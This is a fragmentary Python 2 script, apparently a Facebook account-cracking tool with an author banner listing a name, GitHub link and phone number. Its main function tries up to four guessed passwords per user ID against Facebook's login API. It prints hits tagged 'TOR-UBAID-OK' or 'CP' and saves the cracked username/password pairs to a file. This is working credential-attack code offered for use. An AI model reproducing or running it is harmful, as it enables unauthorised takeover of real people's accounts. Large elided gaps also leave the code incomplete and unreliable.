...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
            ...
            time.sleep(1)
            os.system('xdg-open https://www.facebook.com/profile.php?id=UBaido.Trick.master')
            os.system('clear')
            loop = 'false'
    else:
...
╋╋╋╋╋╋╋╋┗━━┛
 ...
 ​Author   :     Toxic Noyshim
 Facebook :   🇳 🇴 🇾 🇸 🇭 🇮 🇲 
 ​GitHub   :     https://github.com/noyshim504
 ​Whatsapp  :    01832165486
 ​______________________________________________
 ​                                                 """ 
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m  [TOR-UBAID-OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m  [TOR-UBAID-CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [TOR-UBAID-OK] ' + k + c + user + '  |  ' + pass2
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [TOR-UBAID-OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [TOR-UBAID-OK]  ' + k + c + user + '  |  ' + pass4
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass4 + '\n')
                        okb.close()
                        oks.append(c + user + pass4)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m  [TOR-UBAID-CP] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/CP.txt', 'a')
    ...
    raw_input('\n\x1b[1;95m[\x1b[1;98mUbaido_menu_Back\x1b[1;95m]')
    login()
